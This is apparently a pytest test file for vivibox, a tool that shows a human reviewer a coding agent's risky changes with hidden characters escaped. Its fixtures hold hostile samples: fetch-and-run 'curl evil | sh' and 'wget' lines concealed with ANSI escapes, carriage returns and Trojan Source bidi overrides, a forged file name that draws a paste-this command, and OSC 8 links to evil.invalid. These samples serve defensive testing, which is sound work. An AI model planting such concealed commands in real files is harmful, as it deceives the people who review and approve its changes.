"""What the agent chose, as vivibox shows it to you: names and content of the task's clone, with
every character that has nothing to see shown as its code point, never sent to the terminal as
itself and never read as markdown or markup; what is hashed and approved stays the bytes."""

import hashlib
import json
import shlex
import unicodedata

import pytest
from conftest import shown_risky
from markdown_it import MarkdownIt
from test_clone_read import past_the_limit_to_show

from vivibox import actions, display, gate, panel, repo, timeline
from vivibox.cli import main
from vivibox.config import load_config
from vivibox.risky import Approvals, Change
from vivibox.states import State
from vivibox.task import find_task

# A risky change as the P0.1e review made it: a line erased by ESC, a line overwritten by \r
# (Groovy runs it as a line of its own), Trojan Source's bidi override and isolates, a zero-width
# space, DEL and a C1 control.
EVIL = (
    "plugins { id 'java' }\n"
    "exec('wget evil2 | sh')\x1b[2K\x1b[1A\n"
    "exec('curl evil3 | sh')\r// formatting only\n"
    "if (isAdmin\u202e \u2066// check later\u2069 \u2066) {\n"
    "def safe\u200b = 1\x7f\x9b\n"
    "\tindented with a tab\n"
)
ESCAPED = ("‹U+001B›[2K‹U+001B›[1A", "+exec('curl evil3 | sh')‹U+000D›// formatting only\n", "‹U+202E›",
           "‹U+2066›", "‹U+2069›", "‹U+200B›", "‹U+007F›", "‹U+009B›")  # fmt: skip
RAW = "\x1b\r\x7f\x9b\u202e\u2066\u2069\u200b"
# The review's file name: ESC and CR in a folder's name drew a command to paste.
FORGED = "buildSrc/a\x1b[2K\rRead it first (not in your IDE): less -L $(curl -s evil.invalid|sh)/x.gradle"
LINK = "https://evil.invalid"


def hidden(text: str) -> list[str]:
    """The characters of text that reach a terminal as something other than what they look like."""
    return [
        c for c in text if c not in "\n\t" and unicodedata.category(c) in ("Cc", "Cf", "Cs", "Co", "Zl", "Zp")
    ]


def new(env) -> object:
    assert main(["new", "demo", "Change the build", "--draft"]) == 0
    return find_task(load_config().tasks_dir, "demo-1")


def at_approval(task) -> None:
    for state in (State.CHECKPOINT_PLAN, State.IMPLEMENT, State.VERIFY, State.APPROVAL_RISKY):
        task.transition(state)


def risky_section(task) -> str:
    return panel.detail(task, task.read_state(), 3, running=False, pod=panel.PodView())


def links(markdown: str) -> list[str]:
    """Every link a stock parser finds: text read as markdown where it was to be read as it is.
    (The panel's own parser makes a link of none but vivibox's: tests/test_untrusted_text.py.)"""
    tokens = MarkdownIt("gfm-like").parse(markdown)
    children = [c for t in tokens for c in (t.children or [])]
    return [c.attrs.get("href", "") for c in children if c.type == "link_open"]


def fences(markdown: str) -> list[str]:
    return [t.content for t in MarkdownIt("gfm-like").parse(markdown) if t.type == "fence"]


# --- the notation --------------------------------------------------------------------------------


def test_a_name_shows_every_invisible_character_as_its_code_point():
    said = display.name("a\x1b[2K\rb\nc\td\x7f\x85\u202e\u200b\ufeff\u2028\u2029\U000e0041\xa0e")
    assert said == (
        "a‹U+001B›[2K‹U+000D›b‹U+000A›c‹U+0009›d‹U+007F›‹U+0085›‹U+202E›‹U+200B›‹U+FEFF›‹U+2028›"
        "‹U+2029›‹U+E0041›‹U+00A0›e"
    )


def test_ordinary_code_reads_as_it_is():
    """A regex, a Windows path, a backslash, letters of any script: nothing is added to them."""
    line = 'def p = ~/\\d+\\s*$/; def w = "C:\\\\Users\\\\x"; // zażółć 日本 \\n\n'
    assert display.content(line) == line
    assert display.name("src\\main\\Main.java") == "src\\main\\Main.java"


def test_the_notation_cannot_be_imitated():
    """A file whose text is the notation itself never reads like the character it stands for."""
    literal, real = display.content("x = '‹U+001B›'\n"), display.content("x = '\x1b'\n")
    assert literal != real
    assert literal == "x = '‹U+2039›U+001B‹U+203A›'\n"
    assert display.name("a‹U+000D›") != display.name("a\r")


def test_every_character_the_verification_calls_invisible_is_shown_escaped():
    """The verification's HIDDEN and what you are shown agree."""
    every = [chr(c) for c in range(0x110000) if gate.HIDDEN.fullmatch(chr(c))]
    assert every and all(display.name(c) == display.code_point(c) for c in every)
    assert all(display.content(c + "\n") == display.code_point(c) + "\n" for c in every)


def test_a_line_of_content_keeps_its_tab_and_ends_in_one_line_break():
    """A line ends at \\n alone: what else a tool may take for a line break (\\r for bash, FF or
    U+2028 for Groovy, which take them for spaces) is shown in the line it is in."""
    assert display.content("\tx\r\n") == "\tx‹U+000D›\n"
    assert display.content("x\ry\n") == "x‹U+000D›y\n"
    assert display.content("x\u2028y\x0cz\x0b\x85\n") == "x‹U+2028›y‹U+000C›z‹U+000B›‹U+0085›\n"
    assert display.content("last") == f"last\n{display.NO_NEWLINE}\n"
    assert display.content("x\r") != display.content("x\r\n")
    assert display.lines("a\rb\r\nc\x0cd\u2028e\nf") == ["a\rb\r\n", "c\x0cd\u2028e\n", "f"]


def test_markdown_code_is_longer_than_any_backticks_in_it():
    text = "a ``` b\n````\n[x](https://evil.invalid)"
    block = display.fenced(text, "diff")
    assert fences(block) == [text + "\n"] and not links(block)
    assert links(f"- {display.code('`x` [y](https://evil.invalid) `')}") == []


def test_the_screen_gets_no_control_character_and_nothing_escaped_twice():
    assert display.terminal("a\x1b[2K\tb\nc\u202e ‹U+2039›") == "a‹U+001B›[2K\tb\nc‹U+202E› ‹U+2039›"


# --- vivibox risky, the panel, the approval -------------------------------------------------------


def test_a_risky_change_with_control_and_bidi_characters_is_shown_escaped_everywhere(env, capsys):
    task = new(env)
    (task.repo / "build.gradle").write_text(EVIL)
    capsys.readouterr()

    diffs = "".join(actions.risky_diffs(task, actions.load(task.id)[1]))
    assert main(["risky", task.id]) == 0
    cli = capsys.readouterr().out
    at_approval(task)
    shown = risky_section(task)
    for said in (diffs, cli, shown):
        assert not hidden(said) and not set(RAW) & set(said), repr(said)
        assert all(e in said for e in ESCAPED), said
        assert "+\tindented with a tab" in said, "a tab hides nothing"


def test_a_change_shown_escaped_is_approved_as_its_bytes(env, capsys):
    task = new(env)
    (task.repo / "build.gradle").write_text(EVIL)
    at_approval(task)
    assert main(["approve-risky", task.id, shown_risky(task.id)]) == 0
    approved = json.loads((task.meta / "risky" / "approved.json").read_text())
    assert approved["build.gradle"] == hashlib.sha256(EVIL.encode()).hexdigest()
    assert task.read_state().state is State.CHECKPOINT_FINAL


def test_a_name_with_esc_and_cr_draws_no_command(env, capsys, monkeypatch):
    task = new(env)
    past_the_limit_to_show(task.repo / FORGED, monkeypatch, b"plugins { id 'java' }\n")
    approvals = Approvals(task.meta, task.repo)
    diffs = "".join(actions.risky_diffs(task, actions.load(task.id)[1]))
    capsys.readouterr()
    assert main(["risky", task.id]) == 0
    cli = capsys.readouterr().out
    at_approval(task)
    for said in (diffs, cli, risky_section(task)):
        assert not hidden(said), repr(said)
        assert "a‹U+001B›[2K‹U+000D›Read it first" in said
        assert not [line for line in said.splitlines() if line.lstrip("`").startswith("Read it first")]
    command = shlex.join(["less", "-L", "-+R", "-+r", str(approvals.copy_for_you(FORGED))])
    assert f"({command})" in diffs


def test_the_command_to_read_a_large_risky_file_holds_nothing_the_agent_named(env, monkeypatch):
    task = new(env)
    past_the_limit_to_show(task.repo / FORGED, monkeypatch)
    approvals = Approvals(task.meta, task.repo)
    said = approvals.diff(Change(FORGED, "added"))
    view = approvals.copy_for_you(FORGED)
    command = said[said.index("(less") + 1 : said.rindex("), before you approve")]
    assert command == shlex.join(["less", "-L", "-+R", "-+r", str(view)])
    assert view.is_file() and not view.is_symlink()
    assert view.parent == task.meta / "risky" / "view"
    assert not {part for part in FORGED.split("/")} & set(view.relative_to(task.meta).parts)
    assert "x.gradle" not in str(view) and "curl" not in str(view)


def test_markup_and_markdown_in_a_name_and_in_content_are_shown_as_they_are(env):
    """A line of the diff that is the fence closes it (a line kept, " ```"; a name's own line),
    and what follows is markdown: a link a click opens."""
    task = new(env)
    name = "a\n```\n[click](evil.invalid)\n.gradle"
    (task.repo / name).write_text(f"```\n[md]({LINK})\nold\n")
    Approvals(task.meta, task.repo).approve()
    (task.repo / name).write_text(f"```\n[md]({LINK})\n[bold]loud[/bold] [link={LINK}]x[/link]\n")
    at_approval(task)
    shown = risky_section(task)
    assert not [href for href in links(shown) if "evil" in href], links(shown)
    block = next(f for f in fences(shown) if "[bold]" in f)
    assert f"[link={LINK}]x[/link]" in block and f" [md]({LINK})" in block and " ```" in block
    assert "a‹U+000A›```‹U+000A›[click](evil.invalid)‹U+000A›.gradle" in block


def test_a_problem_naming_a_file_with_backticks_stays_in_its_block(env):
    task = new(env)
    task.set_paused(True, problem=f"stopped on an error: git said\n```\n[click]({LINK})\n")
    shown = risky_section(task)
    assert not [href for href in links(shown) if "evil" in href], shown


# --- what else carries a name -------------------------------------------------------------------


def test_git_naming_a_file_with_control_characters_is_shown_escaped(env):
    with pytest.raises(repo.RepoError) as e:
        repo.git("checkout", "x\x1b[2K\u202eabc", cwd=env / "repo")
    said = str(e.value)
    assert not hidden(said), repr(said)
    assert "x‹U+001B›[2K‹U+202E›abc" in said


def test_the_timeline_shows_a_risky_name_escaped(env):
    task = new(env)
    task.event("risky_approved", paths=["a\x1b[2K\rb.gradle"])
    task.event("gate", passed=False, risky_changes=["c\u202e.gradle"])
    said = "\n".join(timeline.lines(task))
    assert not hidden(said) and "a‹U+001B›[2K‹U+000D›b.gradle" in said and "c‹U+202E›.gradle" in said


def test_the_latest_steps_in_the_panel_are_never_read_as_markdown(env):
    task = new(env)
    for state in (State.CHECKPOINT_PLAN, State.IMPLEMENT):
        task.transition(state)
    (task.meta / gate.ACCEPTED_PLAN).write_text(task.plan_path.read_text())
    task.event("risky_approved", paths=[f"x`[click]({LINK})`.gradle"])
    shown = panel.detail(task, task.read_state(), 3, running=True, pod=panel.PodView())
    assert "x`[click]" in shown and not [href for href in links(shown) if "evil" in href]


# --- the view -----------------------------------------------------------------------------------


def test_an_error_naming_a_file_is_never_read_as_markup(env):
    from test_tui import run

    said = f"x [bold]y[/bold] [link={LINK}]z[/link]"

    async def scenario(app, pilot):
        app.fail(repo.RepoError(said))
        await pilot.pause()
        last = list(app._notifications)[-1]
        assert last.message == said and last.markup is False

    run(scenario, notifications=True)


def test_the_details_panel_gets_no_control_character(env):
    from test_tui import run

    task = new(env)
    task.transition(State.CHECKPOINT_PLAN)
    task.plan_path.write_text(task.plan_path.read_text() + "\nhidden\x1b[2K\x1b[1A\u202e line\n")

    async def scenario(app, pilot):
        app.reload()
        await pilot.press("enter")
        await pilot.pause()
        assert "hidden" in app.text.source
        assert not hidden(app.text.source), repr(app.text.source)

    run(scenario)


def test_a_removed_test_named_with_backticks_and_esc_is_shown_as_it_is(env):
    task = new(env)
    task.event("gate", passed=True, removed=[f"a`[click]({LINK})`\x1b[2K.java"], removed_tests=1)
    said = "\n".join(panel.removed_tests(task))
    assert "a`[click]" in said and "‹U+001B›[2K" in said and not hidden(said)
    assert not [href for href in links(said) if "evil" in href], said


def test_vivibox_verify_names_the_agents_files_escaped(env, capsys, monkeypatch):
    task = new(env)
    name = "x\x1b[2K\rRead it first.gradle"
    result = gate.GateResult(
        log=env / "verify.log", hidden_characters=[f"{name}:1 U+202E"], uncommitted=[name],
        risky=[Change(name, "added")], no_red_evidence=[name], removed_tests=[f"{name}: test"],
    )  # fmt: skip
    monkeypatch.setattr(actions, "task_pod", lambda task_id: type("Pod", (), {"up": lambda self: None})())
    monkeypatch.setattr(gate, "run_gate", lambda *a, **k: result)
    capsys.readouterr()
    assert main(["verify", task.id]) == 1
    said = capsys.readouterr().out
    assert not hidden(said), repr(said)
    assert said.count("x‹U+001B›[2K‹U+000D›Read it first.gradle") == 5, said


# --- review round 1 -----------------------------------------------------------------------------

GRADLEW_OLD = "#!/bin/sh\nx=1\r\n#; curl evil | sh\n"  # the comment is a comment
GRADLEW_NEW = "#!/bin/sh\nx=1\r#; curl evil | sh\n"  # bash runs curl: x=1\r# is one word, then ;


def test_a_crlf_line_turned_into_a_lone_cr_is_shown_as_the_change_it_is(env):
    """Case A: the approved gradlew's line break made a line of the comment; a lone \\r makes
    curl run. The two never look the same, and the change is shown."""
    task = new(env)
    (task.repo / "gradlew").write_text(GRADLEW_OLD, newline="")
    Approvals(task.meta, task.repo).approve()
    (task.repo / "gradlew").write_text(GRADLEW_NEW, newline="")
    said = "".join(actions.risky_diffs(task, actions.load(task.id)[1]))
    assert said.startswith("gradlew: changed\n"), said
    assert "\n-x=1‹U+000D›\n-#; curl evil | sh\n" in said, said
    assert "\n+x=1‹U+000D›#; curl evil | sh\n" in said, said


@pytest.mark.parametrize("brk", ["\r", "\x0c", "\x0b", "\x85", "\u2028", "\u2029"])
def test_a_character_a_tool_takes_for_a_space_never_draws_a_line_of_its_own(env, brk):
    """Case B: an added file whose run line looks like an assignment and a comment."""
    task = new(env)
    (task.repo / "build.gradle").write_text(f'def s = "a{brk}// "; exec(\'curl evil|sh\') //"\n', newline="")
    said = "".join(actions.risky_diffs(task, actions.load(task.id)[1]))
    assert f'\n+def s = "a{display.code_point(brk)}// "; exec(\'curl evil|sh\') //"\n' in said, said


def test_a_change_with_nothing_to_show_is_named_and_not_taken_as_seen(env):
    """Whatever made the shown diff empty (a copy of the approval that is not what was approved),
    the file is named, the change said, and p refuses it."""
    task = new(env)
    (task.repo / "pom.xml").write_text("<project/>\n")
    approvals = Approvals(task.meta, task.repo)
    approvals.approve()
    record = json.loads(approvals.record.read_text())
    record["pom.xml"] = hashlib.sha256(b"something else\n").hexdigest()
    approvals.record.write_text(json.dumps(record))
    said = approvals.diff(Change("pom.xml", "changed"))
    assert said.startswith("pom.xml: changed") and "not shown" in said, said
    with pytest.raises(Exception, match="pom.xml"):
        approvals.approve_changes(approvals.view().identity)


def test_an_empty_risky_file_added_is_named_and_approvable(env):
    task = new(env)
    (task.repo / "conftest.py").write_text("")
    approvals = Approvals(task.meta, task.repo)
    assert approvals.diff(Change("conftest.py", "added")).startswith("conftest.py: added")
    assert [c.path for c in approvals.approve_changes(approvals.view().identity)] == ["conftest.py"]


def test_every_diff_is_headed_by_the_file_and_its_change(env):
    task = new(env)
    (task.repo / "pom.xml").write_text("<project/>\n")
    assert actions.risky_diffs(task, actions.load(task.id)[1])[0].startswith("pom.xml: added\n--- approved/")


def test_the_copy_to_read_is_named_by_the_whole_digest_of_its_path(env, monkeypatch):
    """No two paths share a copy: a prefix of 64 bits is a birthday attack away from showing one
    file's content under another's name."""
    task = new(env)
    approvals = Approvals(task.meta, task.repo)
    for path in ("buildSrc/a.gradle", FORGED):
        name = hashlib.sha256(path.encode("utf-8", "surrogateescape")).hexdigest() + ".txt"
        assert approvals.copy_for_you(path).name == name


def test_build_output_and_names_in_the_panel_are_never_markdown(env):
    """A failed verification: the build's words and a file the agent did not commit, as the gate
    writes them for the agent, are shown to you as text, never as a link."""
    from vivibox import feedback

    task = new(env)
    for state in (State.CHECKPOINT_PLAN, State.IMPLEMENT):
        task.transition(state)
    (task.meta / gate.ACCEPTED_PLAN).write_text(task.plan_path.read_text())
    result = gate.GateResult(
        log=env / "verify.log",
        commands=[gate.CommandResult("make test", False, 1.0, said=f"FAILED test\n```\n[advice]({LINK})")],
        uncommitted=["x[click](https://evil.invalid).java"],
    )
    handoff = task.meta / "handoff"
    (handoff / "verify-feedback.md").write_text(feedback.feedback(result))
    (handoff / "verify.log").write_text(f"$ make `x`[c]({LINK})\n```\n[log]({LINK}) {LINK}\n")
    task.event("gate", passed=False, environment=f"see [here]({LINK})")
    shown = panel.detail(task, task.read_state(), 3, running=True, pod=panel.PodView())
    assert "x[click](https://evil.invalid).java" in shown
    assert not [href for href in links(shown) if "evil" in href], links(shown)
    for state in (State.VERIFY, State.CHECKPOINT_BLOCKED):
        task.transition(state)
        shown = panel.detail(task, task.read_state(), 3, running=True, pod=panel.PodView())
        assert not [href for href in links(shown) if "evil" in href], (state, links(shown))


def test_the_verification_as_it_runs_shows_its_log_as_text(env):
    task = new(env)
    for state in (State.CHECKPOINT_PLAN, State.IMPLEMENT, State.VERIFY):
        task.transition(state)
    (task.meta / "log").mkdir(exist_ok=True)
    (task.meta / "log" / "verify-1.log").write_text(f"$ make `x` [c]({LINK})\n```\n[log]({LINK}) {LINK}\n")
    shown = "\n".join(panel.verification_running(task, task.read_state()))
    assert not [href for href in links(shown) if "evil" in href], shown


def test_the_demos_last_output_and_the_commands_proposed_are_text(env):
    pod = panel.PodView(address="10.0.0.2", log=f"```\n[demo]({LINK}) {LINK}")
    assert not [href for href in links("\n".join(pod.lines())) if "evil" in href]
    task = new(env)
    task.transition(State.CHECKPOINT_PLAN)
    (task.meta / "handoff" / "verify-proposal.md").write_text(f"make `x` [c]({LINK}) -Dtest=Foo\n")
    shown = "\n".join(panel.command_to_review(task))
    assert not [href for href in links(shown) if "evil" in href], shown
    task.event("gate", passed=True, build_files=[[f"npm `x` [c]({LINK})", f"[p]({LINK})/package.json"]])
    shown = "\n".join(panel.build_files_left(task))
    assert not [href for href in links(shown) if "evil" in href], shown


CONFLICT = "a[link=https://evil.invalid]x[/link][black on black]y[/][/b]\x1b[2K\u202e.java"


def test_a_conflict_the_agent_named_is_shown_as_text_everywhere(env, capsys):
    from vivibox import cli_decisions, ui

    done = actions.Finished("demo-1", env / "repo", ui.Spend(), "msg", "vivibox/demo-1", [CONFLICT])
    cli_decisions.report_finished(done)
    said = capsys.readouterr().out
    assert not hidden(said) and "a[link=https://evil.invalid]x[/link]" in said and "‹U+001B›[2K" in said
    entry = {"id": "demo-1", "project": "demo", "title": "t", "cost": 0, "commit": "abc", "finished": "",
             "branch": "vivibox/demo-1", "conflicts": [f"c[click]({LINK})"], "criteria": []}  # fmt: skip
    entry["finished"] = __import__("vivibox.task", fromlist=["now"]).now()
    shown = panel.finished_detail(entry)
    assert f"c[click]({LINK})" in shown and not [href for href in links(shown) if "evil" in href]


def test_a_conflict_and_a_commit_subject_in_a_notification_are_never_markup(env, monkeypatch):
    from test_tui import run

    from vivibox import ui

    done = actions.Finished("demo-1", env / "repo", ui.Spend(), "msg", "vivibox/demo-1", [CONFLICT])

    async def scenario(app, pilot):
        app.finished(done)
        await pilot.pause()
        last = list(app._notifications)[-1]
        assert last.markup is False and "[link=https://evil.invalid]" in last.message
        assert not hidden(last.message), repr(last.message)

    run(scenario, notifications=True)


@pytest.mark.real_notify  # notify-send itself is stood in for below; nothing reaches the desktop
def test_the_desktop_notification_is_never_markup(monkeypatch, capsys):
    from vivibox import supervisor

    sent = []
    monkeypatch.setattr(supervisor.shutil, "which", lambda name: "/usr/bin/notify-send")
    monkeypatch.setattr(supervisor.subprocess, "run", lambda command, **kw: sent.append(command))
    supervisor.notify("demo-1", "x<b>BIG</b>y &amp; \x1b[41mRED\x1b[0m \u202eevil")
    body = sent[-1][3]
    assert "<b>" not in body and "&lt;b&gt;BIG&lt;/b&gt;" in body and "&amp;amp;" in body
    assert not hidden(body) and "‹U+001B›[41m" in body
    window = capsys.readouterr().out
    assert not hidden(window) and "‹U+001B›[41mRED" in window


def test_the_work_is_paged_with_the_agents_escapes_shown(env):
    """f: what the agent wrote can neither conceal a line (SGR 8) nor be a link (OSC 8), whatever
    the pager passes through; the colours are vivibox's own."""
    from test_tui import final

    from vivibox import keys_work
    from vivibox.config import load_project

    task = final()
    command = keys_work.diff_pager(task, load_project("demo"))
    paged = __import__("pathlib").Path(command[-1])
    assert command == panel.pager_command(paged, colours=True)
    text = paged.read_text()
    ours = __import__("re").sub(r"\x1b\[[0-9;]*m", "", text)
    assert "\x1b" not in ours and "Health.java" in text
    assert panel.git_env()["LESS"]


def test_the_work_hides_nothing_the_agent_escaped(env, tmp_path):
    from vivibox import keys_work

    lines = keys_work.shown_diff(
        ["diff --git a/x b/x\n", "+\x1b[8mexec('curl evil | sh')\x1b[0m// tidy\n",
         "+\x1b]8;;https://evil.invalid\x1b\\docs\x1b]8;;\x1b\\\n", "-old\r\n", "@@ -1 +1 @@\n"]
    )  # fmt: skip
    text = "".join(lines)
    ours = __import__("re").sub(r"\x1b\[[0-9;]*m", "", text)
    assert "\x1b" not in ours and "\r" not in ours
    assert "‹U+001B›[8mexec('curl evil | sh')‹U+001B›[0m// tidy" in ours
    assert "‹U+001B›]8;;https://evil.invalid‹U+001B›\\docs" in ours and "-old‹U+000D›\n" in ours


def test_the_agents_summary_reaches_no_terminal_as_is(env, capsys):
    """The plan's summary is the task's goal: in the list, in vivibox status and its detail, in
    the timeline."""
    from vivibox import ui

    task = new(env)
    task.set_goal("Tidy the build\x1b[41mRED\x1b[0m \u202eevil\u202c done\nFAKE")
    for args in (["status"], ["status", task.id], ["timeline", task.id]):
        capsys.readouterr()
        assert main(args) == 0
        said = capsys.readouterr().out
        assert "‹U+001B›[41mRED" in said and "‹U+202E›evil" in said, (args, said)
        assert not hidden(said), (args, repr(said))
    assert "FAKE" in ui.task_list([task], lambda t: "-", 3, ui.Style(False)).splitlines()[1]


def test_the_agents_summary_in_the_list_of_the_view(env):
    from test_tui import cell_of, run

    task = new(env)
    task.set_goal("Tidy\x1b[41mRED\x1b[0m \u202eevil")

    async def scenario(app, pilot):
        app.reload()
        await pilot.pause()
        goal = cell_of(app, task.id, "GOAL")
        assert "‹U+001B›[41mRED" in goal and not hidden(goal), repr(goal)

    run(scenario)


# --- the pager under l, and w on the verification -----------------------------------------------


def test_every_log_l_opens_passes_no_escape_sequence_whatever_your_less_says(env, monkeypatch):
    """Under LESS=-R (oh-my-zsh's) a build log's ESC[8m hid lines and OSC 8 made links: every entry
    of l opens in less with -+R -+r, after whatever your LESS and PAGER say."""
    from vivibox import logs

    monkeypatch.setenv("LESS", "-R")
    monkeypatch.setenv("PAGER", "less -R")
    task = new(env)
    (task.meta / "log").mkdir(exist_ok=True)
    (task.meta / "log" / "verify-1-120000.log").write_text("\x1b[8mexec('curl evil | sh')\x1b[0m\n")
    (task.meta / "log" / "supervisor.log").write_text("x\n")
    entries, _ = logs.entries(task, task.read_state(), running=False)
    assert len(entries) >= 3, "the timeline, the verification's log, the supervisor's"
    for entry in entries:
        less = entry.command
        assert less[0] == "less" and less.index("-+R") > less.index("-R") and "-+r" in less, less
    assert panel.log_command(task, task.read_state(), running=False)[1:4] == ["-R", "-+R", "-+r"]


def test_the_verification_w_follows_reaches_the_terminal_as_text(env):
    import io

    from vivibox import logs

    task = new(env)
    log = env / "verify.log"
    log.write_text("\x1b[8mexec('curl evil | sh')\x1b[0m\x1b]8;;https://evil.invalid\x1b\\docs\r\n")
    out = io.StringIO()
    logs.follow_verification(task, log, out, sleep=lambda s: None)
    said = out.getvalue()
    assert not [c for c in said if c != "\n" and unicodedata.category(c) == "Cc"], repr(said)
    assert "‹U+001B›[8mexec('curl evil | sh')‹U+001B›[0m‹U+001B›]8;;https://evil.invalid" in said


# --- review round 2 -----------------------------------------------------------------------------

LOG = (
    "\x1b[8mexec('curl evil | sh')\x1b[0m// tidy\n"
    "\x1b]8;;https://evil.invalid\x1b\\docs\x1b]8;;\x1b\\\n"
    "end\r over\n"
)


@pytest.mark.parametrize("pager", ["cat", "more", "fallback"])
def test_a_pager_other_than_less_gets_the_log_escaped(env, monkeypatch, pager):
    """cat and more pass every escape sequence on, and only less is given -+R -+r: any other
    pager, yours or the more vivibox falls back on without less, reads an escaped copy."""
    log = env / "evil.log"
    log.write_bytes(LOG.encode())
    if pager == "fallback":
        monkeypatch.delenv("PAGER", raising=False)
        monkeypatch.setattr(panel.shutil, "which", lambda name: None)
    else:
        monkeypatch.setenv("PAGER", pager)
    command = panel.pager_command(log, at_end=True)
    assert command[0] == ("more" if pager == "fallback" else pager)
    paged = __import__("pathlib").Path(command[-1])
    assert paged != log and not str(paged).startswith(str(env / "tasks")), "a copy of vivibox's own"
    text = paged.read_text()
    assert "\x1b" not in text and "\r" not in text, repr(text)
    assert "‹U+001B›[8mexec('curl evil | sh')‹U+001B›[0m" in text and "end‹U+000D› over" in text
    assert log.read_bytes() == LOG.encode(), "the log itself stays as it is"


def test_less_still_reads_the_log_itself(env, monkeypatch):
    log = env / "evil.log"
    log.write_text(LOG)
    monkeypatch.setenv("PAGER", "less")
    assert panel.pager_command(log, follow=True) == ["less", "-+R", "-+r", "+F", str(log)]


def test_the_files_to_commit_are_never_markup(env):
    from test_tui import run
    from textual.widgets import Label

    from vivibox import ui
    from vivibox.dialogs import CommitWork

    status = "A  x[/b].java\nA  a[black on black].java\nA  after\x1b[2K\u202e.java\n"
    done = actions.Finished("demo-1", env / "repo", ui.Spend(), "msg", "", [], status)
    done.start_branch, done.new_branch = "main", "feature/demo-1"

    async def scenario(app, pilot):
        app.push_screen(CommitWork(done))
        await pilot.pause()
        shown = str(app.screen.query(Label).filter(".files").first().render())
        assert "x[/b].java" in shown and "a[black on black].java" in shown and "after" in shown, shown
        assert not hidden(shown), repr(shown)

    run(scenario)


def test_a_proposed_command_is_never_markup_in_its_dialog_nor_its_notification(env):
    from test_tui import at_command_checkpoint, run
    from textual.widgets import Label

    from vivibox.verify_ui import AskVerify

    task = at_command_checkpoint(env, "./mvnw -pl x[/b],a[black on black] verify")

    async def scenario(app, pilot):
        app.reload()
        await pilot.pause()
        await pilot.press("e")
        await pilot.pause()
        assert isinstance(app.screen, AskVerify)
        heading = str(app.screen.query(Label).first().render())
        assert "narrowed to -pl x[/b],a[black:" in heading, heading
        await pilot.press("enter")
        await pilot.pause()
        said = [n for n in app._notifications if "is verified with" in n.message]
        assert said and said[-1].markup is False and "x[/b]" in said[-1].message

    run(scenario, notifications=True)
    assert task.read_state().state is not State.CHECKPOINT_COMMAND


def test_a_line_break_in_a_message_draws_no_line_of_the_supervisors_own(monkeypatch, capsys):
    """The window's lines start with the time: a message's next line is indented under it, never
    a [hh:mm:ss] line of its own."""
    from vivibox import supervisor

    monkeypatch.setattr(supervisor.shutil, "which", lambda name: None)
    supervisor.notify("demo-1", "agent turn failed: boom\n[12:00:00] plan accepted, all checks passed")
    lines = capsys.readouterr().out.splitlines()
    assert len(lines) == 2 and lines[0].startswith("[") and lines[1].startswith("    [12:00:00]"), lines


def test_the_files_left_uncommitted_are_printed_as_text(env, capsys, monkeypatch):
    from vivibox import cli_decisions, ui

    monkeypatch.setattr(actions, "current_branch", lambda source: "main")
    monkeypatch.setattr(cli_decisions, "offer_commit", lambda done: None)
    done = actions.Finished("demo-1", env / "repo", ui.Spend(), "msg", "", [], "A  a\u202eb\x1b[2K.java\n")
    cli_decisions.report_finished(done)
    said = capsys.readouterr().out
    assert "A  a‹U+202E›b‹U+001B›[2K.java" in said and not hidden(said), repr(said)


@pytest.mark.parametrize("state", [State.IMPLEMENT, State.CHECKPOINT_BLOCKED])
def test_no_empty_block_for_feedback_there_is_none_of(env, state):
    task = new(env)
    for s in (State.CHECKPOINT_PLAN, State.IMPLEMENT):
        task.transition(s)
    (task.meta / gate.ACCEPTED_PLAN).write_text(task.plan_path.read_text())
    task.event("gate", passed=False)
    if state is State.CHECKPOINT_BLOCKED:
        task.transition(State.VERIFY)
        task.transition(State.CHECKPOINT_BLOCKED)
    shown = panel.detail(task, task.read_state(), 3, running=True, pod=panel.PodView())
    assert not [f for f in fences(shown) if not f.strip()], shown
